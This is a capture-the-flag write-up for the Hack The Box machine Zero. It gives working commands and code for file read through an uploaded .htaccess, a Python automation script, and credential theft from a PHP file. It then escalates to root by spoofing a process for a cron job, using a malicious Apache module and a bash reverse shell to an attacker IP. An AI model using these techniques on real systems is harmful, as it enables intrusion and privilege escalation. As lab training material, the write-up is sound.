---
icon: cannabis
cover: ../../../../.gitbook/assets/Screenshot 2026-02-04 153315.png
coverY: 0
---

# HTB-ZERO(VL)

### Reconnaissance

#### Initial Scanning

Starting with a comprehensive port scan using rustscan to identify open services:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ rustscan -a 10.121.224.32 blah blah blah
```

The scan reveals two open TCP ports:

* **SSH (22)** - OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
* **HTTP (80)** - Apache httpd 2.4.41 (Ubuntu)

Based on the OpenSSH and Apache versions, the target is likely running **Ubuntu 20.04 focal**.

All ports show a TTL of 63, confirming this is a Linux host one hop away.

#### Website Enumeration (Port 80)

Adding the hostname to our hosts file:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ echo "10.121.224.32 zero.vl" | sudo tee -a /etc/hosts
```

The website is a hosting provider offering static HTML page hosting with SFTP upload capabilities.

**Initial Discovery**

Visiting the main page shows a hosting service with the following features:

* SFTP upload for secure file transfer
* Static HTML-only hosting
* Statistics page at `/stats.php`
* Sign-up functionality at `/signup.php`

The "Request credentials" button generates random credentials:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ curl -s http://zero.vl/get-credentials-please-do-not-spam-this-thanks.php | grep -oP 'Username: <b>\K[^<]+'
zro-afb97e8f

┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ curl -s http://zero.vl/get-credentials-please-do-not-spam-this-thanks.php | grep -oP 'Password: <b>\K[^<]+'
2699d1a5
```

The user's site is located at `http://zero.vl/~zro-afb97e8f/` (username prepended with "\~").

**Directory Enumeration**

Running feroxbuster to discover additional pages:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ feroxbuster -u http://zero.vl -x php --dont-extract-links

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://zero.vl
 🚀  Threads               │ 50
───────────────────────────┴──────────────────────
200      GET        9l       25w      205c http://zero.vl/
200      GET       75l      246w     3285c http://zero.vl/stats.php
200      GET      114l      400w     5173c http://zero.vl/index.php
200      GET      820l     4248w    72818c http://zero.vl/info.php
200      GET       89l      269w     3675c http://zero.vl/signup.php
301      GET        9l       28w      301c http://zero.vl/dist => http://zero.vl/dist/
```

The `/info.php` page shows standard PHPinfo output with no immediately exploitable information.

#### SFTP Enumeration (Port 22)

**SSH Access Test**

Attempting direct SSH access fails:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ sshpass -p 2699d1a5 ssh zro-afb97e8f@zero.vl
PTY allocation request failed on channel 0
This service allows sftp connections only.
Connection to 10.121.224.32 closed.
```

Even attempting to force commands fails:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ sshpass -p 2699d1a5 ssh zro-afb97e8f@zero.vl id
This service allows sftp connections only.

┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ sshpass -p 2699d1a5 ssh zro-afb97e8f@zero.vl -t bash
PTY allocation request failed on channel 0
```

**SFTP Access**

SFTP connection works successfully:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ sshpass -p 2699d1a5 sftp zro-afb97e8f@zero.vl
Connected to zero.vl.
sftp> ls -la
drwxr-xr-x    3 root     root         4096 Aug  6 19:02 .
drwxr-xr-x    3 root     root         4096 Aug  6 19:02 ..
drwxr-xr-x    2 1001     1001         4096 Aug  6 19:02 public_html

sftp> cd public_html/
sftp> ls -la
drwxr-xr-x    2 1001     1001         4096 Aug  6 19:45 .
drwxr-xr-x    3 root     root         4096 Aug  6 19:45 ..
-rw-r--r--    1 root     root           49 Aug  6 19:45 .htaccess
-rw-r--r--    1 1001     1001          349 Feb 15  2019 index.html
```

Downloading existing files:

```bash
sftp> get index.html
Fetching /public_html/index.html to index.html
sftp> get .htaccess
Fetching /public_html/.htaccess to .htaccess
```

The `.htaccess` file sets a custom header:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ cat .htaccess
Header always set X-Zero-Customer 'zro-de834d1c'
```

### Shell as zroadmin

#### Failed Exploitation Attempts

**PHP Upload Attempt**

Creating a test PHP file:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ cat > test.php << 'EOF'
<?php
echo "test";
EOF
```

Uploading via SFTP:

```bash
sftp> put test.php
Uploading test.php to /public_html/test.php
```

Testing execution:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ curl http://zero.vl/~zro-de834d1c/test.php
<?php

echo "test";
```

The PHP code is returned raw - not executed. Testing alternative extensions (.php3, .php4, .php5, .php6, .phps, .inc) also fails to execute.

**.htaccess Modification Attempt**

Trying to enable PHP processing via .htaccess:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ cat > htaccess-php << 'EOF'
Header always set X-Zero-Customer 'zro-de834d1c'
AddHandler application/x-httpd-php .php
EOF
```

Attempting to upload fails due to permissions:

```bash
sftp> put htaccess-php .htaccess
Uploading htaccess-php to /public_html/.htaccess
dest open "/public_html/.htaccess": Permission denied
```

However, we can **rename** the existing file first (since we own the directory):

```bash
sftp> rename .htaccess .htaccess.bk
sftp> put htaccess-php .htaccess
Uploading htaccess-php to /public_html/.htaccess
```

Unfortunately, PHP still doesn't execute even after this change.

#### Successful .htaccess File Read Exploitation

**Discovery**

Based on research into .htaccess abuse techniques, I discovered that ErrorDocument directives can be used to read local files using the `%{file:...}` syntax.

**Proof of Concept**

Creating a malicious .htaccess to read `/etc/passwd`:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ cat > malicious.htaccess << 'EOF'
Header always set X-Zero-Customer 'zro-de834d1c'
ErrorDocument 404 %{file:/etc/passwd}
EOF
```

Uploading it:

```bash
sftp> rename .htaccess .htaccess.bk
sftp> put malicious.htaccess .htaccess
```

Triggering a 404 to read the file:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ curl http://zero.vl/~zro-de834d1c/nonexistent
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[...snip...]
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
zroadmin:x:666:666::/home/zroadmin:/bin/bash
fwupd-refresh:x:114:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:997::/var/log/laurel:/bin/false
zro-de834d1c:x:1001:1001::/home/zro-de834d1c:/bin/false
```

Success! We have arbitrary file read.

**Automation Script**

Creating a Python script to automate file reading:

```python
# /// script
# requires-python = ">=3.12"
# dependencies = [
#     "paramiko",
#     "requests",
# ]
# ///
import sys
import paramiko
import requests


if len(sys.argv) != 5:
    print(f"usage: {sys.argv[0]} <host> <username> <password> <file to read>")
    sys.exit(1)

host, username, password, target_file = sys.argv[1:5]


def write_file(host, username, password, content):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(hostname=host, port=22, username=username, password=password)
    sftp_client = ssh_client.open_sftp()
    target_path = "public_html/.htaccess"
    sftp_client.remove(target_path)
    with sftp_client.file(target_path, "wb") as remote_file:
        remote_file.write(content)
    sftp_client.close()
    ssh_client.close()


def read_file(host, username):
    resp = requests.get(f"http://{host}/~{username}/GOKU.whatever")
    assert resp.status_code == 404
    return resp.text


htcontent = f"ErrorDocument 404 %{{file:{target_file}}}".encode()

write_file(host, username, password, htcontent)
print(read_file(host, username))
```

Testing the script:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ uv add --script read_file.py paramiko requests

┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ uv run --script read_file.py zero.vl zro-de834d1c cbc6427b /etc/hosts
127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
```

#### Extracting Database Credentials

Reading the stats.php file to find database credentials:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ uv run --script read_file.py zero.vl zro-de834d1c cbc6427b /var/www/html/stats.php | grep mysqli
$mysqli = new mysqli("localhost", "zroadmin", "correct-horse-battery-staple", "zro");
```

Found credentials:

* **Username**: zroadmin
* **Password**: correct-horse-battery-staple

#### SSH Access as zroadmin

Testing SSH access with discovered credentials:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ sshpass -p correct-horse-battery-staple ssh zroadmin@zero.vl
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1084-aws x86_64)

 System information as of Wed Aug  6 20:46:03 UTC 2025

  System load:  0.08              Processes:             215
  Usage of /:   57.3% of 5.05GB   Users logged in:       0
  Memory usage: 7%                IPv4 address for eth0: 10.121.224.32
  Swap usage:   0%

zroadmin@zero:~$
```

### Privilege Escalation to root

#### System Enumeration

**User Permissions**

Checking sudo privileges:

```bash
zroadmin@zero:~$ sudo -l
[sudo] password for zroadmin:
Sorry, user zroadmin may not run sudo on zero.
```

No sudo access available.

**Home Directories**

Listing users with home directories:

```bash
zroadmin@zero:/home$ ls
ubuntu  zro-de834d1c  zroadmin

zroadmin@zero:/home$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
zroadmin:x:666:666::/home/zroadmin:/bin/bash
```

The zroadmin home directory contains nothing of interest. We have access to `zro-de834d1c` (our created web user) but not to `ubuntu`.

**Web Configuration**

Checking Apache configuration reveals interesting logging setup:

```bash
zroadmin@zero:/etc/apache2/sites-enabled$ cat 000-default.conf | grep -vP '^\s#' | grep .
<VirtualHost *:80>
        ServerAdmin webmaster@zero.vl
        DocumentRoot /var/www/html
        LogFormat "%{X-Zero-Username}o %{X-Zero-Password}o" accounts
        CustomLog ${APACHE_LOG_DIR}/accounts.log accounts
</VirtualHost>
```

Apache is logging the `X-Zero-Username` and `X-Zero-Password` headers to `/var/log/apache2/accounts.log`. This file is likely monitored by a cron job to create new user accounts.

#### Process Monitoring

Uploading pspy to monitor running processes:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ python3 -m http.server 80
```

On the target:

```bash
zroadmin@zero:/dev/shm$ wget 10.10.14.41/pspy64
zroadmin@zero:/dev/shm$ chmod +x pspy64
zroadmin@zero:/dev/shm$ ./pspy64
```

Every minute, several cron jobs run as root:

```
2025/08/07 01:12:01 CMD: UID=0     PID=36191  | /usr/bin/bash /usr/local/bin/zro.web-confcheck
2025/08/07 01:12:01 CMD: UID=0     PID=36215  | /bin/bash /root/bin/create-account.sh
2025/08/07 01:12:01 CMD: UID=0     PID=36221  | /usr/bin/python3 /root/bin/cleanup.py
2025/08/07 01:12:01 CMD: UID=0     PID=36223  | /bin/bash /root/bin/update-stats.sh
```

The most interesting is `/usr/local/bin/zro.web-confcheck` - it's world-readable unlike the scripts in `/root/bin/`.

#### Analyzing zro.web-confcheck

Reading the script:

```bash
zroadmin@zero:~$ cat /usr/local/bin/zro.web-confcheck
#!/usr/bin/bash
RET=0
while read pid _cmd ; do
        # Replace apache2 with apache2ctl and add -t for test
        cmd="${_cmd/apache2/apache2ctl} -t"
        $cmd >/dev/null 2>&1
        RET=$?
done <<< $(/usr/bin/pgrep -lfa "^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf")
if [[ $RET -eq 0 ]] ; then
        echo 'Configuration correct. \o/'
else
        echo 'Configuration broken. Please fix immediately!' >&2
fi
exit $RET
```

This script:

1. Uses `pgrep -lfa` to find processes matching a specific apache2 pattern
2. Replaces `apache2` with `apache2ctl` in the command line
3. Adds `-t` flag and executes it as root
4. The `-t` flag tests Apache configuration

Key insight: We can create a fake process with a controlled command line that will be executed as root!

#### Exploitation Strategy

The script is looking for processes matching: `/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf`

We can:

1. Create a fake process with this pattern in its command line
2. Append additional apache2ctl arguments (like `-d /our/malicious/config`)
3. When executed, the last `-d` argument will be used
4. We control what apache2ctl loads and validates

#### Method 1: Partial File Read (Flag Only)

**Creating Fake Process**

First, let's create a way to fake the process command line using Perl:

```bash
zroadmin@zero:/dev/shm$ cat > fake_process.pl << 'EOF'
#!/bin/perl

$0 = "/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/fileread -E /dev/shm/fileread.log -c";
sleep(223);
EOF

zroadmin@zero:/dev/shm$ chmod +x fake_process.pl
```

**Setting Up Malicious Config**

Copying Apache config and modifying it to read `/root/root.txt`:

```bash
zroadmin@zero:/dev/shm$ cp -R /etc/apache2 /dev/shm/fileread
zroadmin@zero:/dev/shm$ cat > /dev/shm/fileread/apache2.conf << 'EOF'
Include /root/root.txt
EOF
```

The `-E /dev/shm/fileread.log` flag will log errors to a file we can read.

**Testing the Fake Process**

Verifying pgrep sees our fake process:

```bash
zroadmin@zero:/dev/shm$ ./fake_process.pl &
[1] 3883

zroadmin@zero:/dev/shm$ /usr/bin/pgrep -lfa "^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf"
3883 /opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/fileread -E /dev/shm/fileread.log -c 223
```

Perfect! The cron will execute this as:

```
apache2ctl -k start -d /opt/zroweb/conf -d /dev/shm/fileread -E /dev/shm/fileread.log -c 223 -t
```

The `-c 223` consumes the stray argument, and apache2ctl will try to read `/dev/shm/fileread/apache2.conf`.

**Waiting for Cron Execution**

After the minute rolls over, checking the log:

```bash
zroadmin@zero:/dev/shm$ cat fileread.log
AH00526: Syntax error on line 1 of /root/root.txt:
Invalid command '015c84275247026ff80c2432a360be0d', perhaps misspelled or defined by a module not included in the server configuration
```

The flag is revealed in the error message!

#### Method 2: Shell via Malicious Apache Module

For a proper shell, we can create a malicious Apache module that executes code when loaded.

**Creating the Malicious Module**

```bash
zroadmin@zero:/dev/shm$ cat > GOKUmodule.c << 'EOF'
#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "ap_config.h"

static void myinit(apr_pool_t *p, server_rec *s) {
    system("cp /bin/bash /tmp/GOKU; chown root:root /tmp/GOKU; chmod 6777 /tmp/GOKU");
}

module AP_MODULE_DECLARE_DATA mymodule = {
    STANDARD20_MODULE_STUFF,
    NULL, NULL, NULL, NULL, NULL,
    NULL
};

__attribute__((constructor))
static void _init() { myinit(NULL, NULL); }
EOF
```

**Compiling the Module**

```bash
zroadmin@zero:/dev/shm$ apxs -c GOKUmodule.c
/usr/share/apr-1.0/build/libtool  --mode=compile --tag=disable-static x86_64-linux-gnu-gcc -prefer-pic -pipe -g -O2 -fstack-protector-strong -Wformat -Werror=format-security  -Wdate-time -D_FORTIFY_SOURCE=2   -DLINUX -D_REENTRANT -D_GNU_SOURCE  -pthread  -I/usr/include/apache2  -I/usr/include/apr-1.0   -I/usr/include/apr-1.0 -I/usr/include  -c -o GOKUmodule.lo GOKUmodule.c && touch GOKUmodule.slo
[...compilation output...]

zroadmin@zero:/dev/shm$ file .libs/GOKUmodule.so
.libs/GOKUmodule.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=2a8886fbba4c51abe69826a5e9d8220b5a25583f, with debug_info, not stripped
```

**Setting Up Config Directory**

```bash
zroadmin@zero:/dev/shm$ cp -R /etc/apache2 module
zroadmin@zero:/dev/shm$ mkdir module/modules
zroadmin@zero:/dev/shm$ cp .libs/GOKUmodule.so module/modules/

zroadmin@zero:/dev/shm$ cat > module/apache2.conf << 'EOF'
LoadModule GOKUmodule modules/GOKUmodule.so
EOF
```

**Creating Fake Process**

```bash
zroadmin@zero:/dev/shm$ cat > fake_module.pl << 'EOF'
#!/bin/perl

$0 = "/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/module -c";
sleep(223);
EOF

zroadmin@zero:/dev/shm$ chmod +x fake_module.pl
zroadmin@zero:/dev/shm$ ./fake_module.pl &
```

**Getting Root Shell**

After the cron runs (up to 1 minute), checking for the SUID bash:

```bash
zroadmin@zero:/dev/shm$ ls -l /tmp/GOKU
-rwsrwsrwx 1 root root 1183448 Aug 10 20:44 /tmp/GOKU
```

#### Method 3: Shell via Log Pipe

This method uses Apache's error log pipe feature to execute code.

**Creating Working Directory**

```bash
zroadmin@zero:/dev/shm$ mkdir errorlog
```

**Creating Minimal Apache Config**

```bash
zroadmin@zero:/dev/shm$ cat > errorlog/apache2.conf << 'EOF'
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so

ServerRoot "/dev/shm/"
Listen 9999
ServerName localhost

ErrorLog "|/dev/shm/rev.sh"
EOF
```

The `ErrorLog "|/dev/shm/rev.sh"` directive pipes errors to our script for execution.

**Creating Reverse Shell Script**

```bash
zroadmin@zero:/dev/shm$ cat > rev.sh << 'EOF'
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.41/443 0>&1
EOF

zroadmin@zero:/dev/shm$ chmod +x rev.sh
```

**Creating Fake Process Without -t**

For this method, we need to eliminate the `-t` flag entirely. Using Perl to set the process name:

```bash
zroadmin@zero:/dev/shm$ cat > fake_errorlog.pl << 'EOF'
#!/bin/perl

$0 = "/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/errorlog -D";
sleep(223);
EOF

zroadmin@zero:/dev/shm$ chmod +x fake_errorlog.pl
zroadmin@zero:/dev/shm$ ./fake_errorlog.pl &
```

When the script runs, it becomes:

```
apache2ctl -k start -d /opt/zroweb/conf -d /dev/shm/errorlog -D -t
```

The `-D -t` becomes `-D` with argument `-t`, consuming the problematic flag.

**Setting Up Listener**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/ZERO]
└─$ nc -lnvp 443
Listening on 0.0.0.0 443
```

**Receiving Root Shell**

After the cron executes (within 1 minute):

```bash
Connection received on 10.121.224.32 46374
bash: cannot set terminal process group (52934): Inappropriate ioctl for device
bash: no job control in this shell

root@zero:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
```

The box required creative thinking around .htaccess abuse, process manipulation, and Apache configuration exploitation to achieve full compromise.

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
